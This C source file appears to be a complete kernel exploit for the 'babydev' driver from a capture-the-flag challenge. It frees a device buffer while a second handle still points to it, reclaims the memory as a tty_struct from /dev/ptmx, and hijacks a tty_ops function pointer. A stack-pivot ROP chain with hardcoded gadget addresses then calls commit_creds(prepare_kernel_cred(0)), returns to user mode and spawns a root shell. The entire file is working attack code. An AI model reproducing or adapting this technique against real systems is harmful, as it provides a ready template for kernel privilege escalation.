#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/mman.h>

#define ULL unsigned long long

/* tty magic number */
#define TTY_MAGIC		0x5401

char buf[64];
ULL rop_chain[0x100];

unsigned long user_cs, user_ss, user_eflags, user_sp;
void save_stats() {
    asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "movq %%rsp, %3\n"
            "pushfq\n"
            "popq %2\n"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_eflags), "=r"(user_sp)
            :
            : "memory"
    );
}

void print_buf(void)
{
    ULL *p = (ULL *)buf;
    for (int i = 0; i <= 7; i += 2) {
        printf("[>] buf %d: %016llx %016llx\n", i, p[i], p[i+1]);
    }
}

int openstat(void)
{
    int stat_fd;
    if ((stat_fd = open("/proc/self/stat", O_RDONLY)) == -1) {
        printf("error: open\n");
        exit(1);
    }
    return stat_fd;
}

void get_shell(void)
{
    system("/bin/sh");
}

void exploit(void)
{
    char garbage[0x10] = { 0 };
    int fd1, fd2;
    int fd_tty;
    ULL fake_tty_struct[4];
    ULL fake_tty_ops[16];
    ULL rop_idx;

    // Gadgets
    ULL xchg_eax_esp = 0xffffffff8100008a;
    ULL pop_rdi = 0xffffffff810d238d;
    ULL mov_rdi_rax_pop_rbx_r12_rbp = 0xffffffff81177417;
    ULL commit_creds = 0xffffffff810a1420;
    ULL prepare_kernel_cred = 0xffffffff810a1810;
    ULL swapgs_pop_rbp = 0xffffffff81063694;
    ULL iretq = 0xffffffff814e35ef;

    save_stats();

    // Prepare rop chains
    // Calculate rop_chain address
    ULL addr = (ULL)fake_tty_ops & 0xffffffff; 

    // Allocate rop_chain address space
    ULL *rop_chain = mmap((void *)addr, 
                          0x1000, 
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS,
                          0,
                          0);

    if (!rop_chain) {
        printf("[x] mmap failed\n");
        exit(1);
    }
    printf("[>] rop_chain: %p\n", rop_chain);
    rop_idx = (addr - (ULL)rop_chain) / 8;
    
    // Game start
    fd1 = open("/dev/babydev", O_RDWR);
    fd2 = open("/dev/babydev", O_RDWR);

    // kfree
    close(fd2);

    // Leak Kernel Address
    // No KASLR
    // read(fd1, buf, 63);
    // print_buf();

    // Put my gadget
    rop_chain[rop_idx++] = pop_rdi;
    rop_chain[rop_idx++] = 0;
    rop_chain[rop_idx++] = prepare_kernel_cred;
    rop_chain[rop_idx++] = mov_rdi_rax_pop_rbx_r12_rbp;
    rop_chain[rop_idx++] = 0;
    rop_chain[rop_idx++] = 0;
    rop_chain[rop_idx++] = (ULL)rop_chain;
    rop_chain[rop_idx++] = commit_creds;
    rop_chain[rop_idx++] = swapgs_pop_rbp;
    rop_chain[rop_idx++] = (ULL)rop_chain;
    rop_chain[rop_idx++] = iretq;
    rop_chain[rop_idx++] = (ULL)get_shell;
    rop_chain[rop_idx++] = user_cs;
    rop_chain[rop_idx++] = user_eflags;
    rop_chain[rop_idx++] = user_sp;
    rop_chain[rop_idx++] = user_ss;

    // Allocate again
    fd2 = open("/dev/babydev", O_RDWR);

    // Allocate to custom size
    ioctl(fd1, 0x10001, 0x2e0);

    // kfree again
    close(fd2);

    // Allocate tty_struct
    fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);

    // Now we have overlap!
    // Overwrite function pointer
    fake_tty_struct[0] = TTY_MAGIC;
    fake_tty_struct[3] = (ULL)fake_tty_ops;
    fake_tty_ops[7] = xchg_eax_esp;
    printf("[>] fake_tty_ops: %p\n", fake_tty_ops);
    write(fd1, fake_tty_struct, sizeof(fake_tty_struct));

    // Invoke
    write(fd_tty, garbage, 0x10);
}

int main(void)
{
    exploit();
}
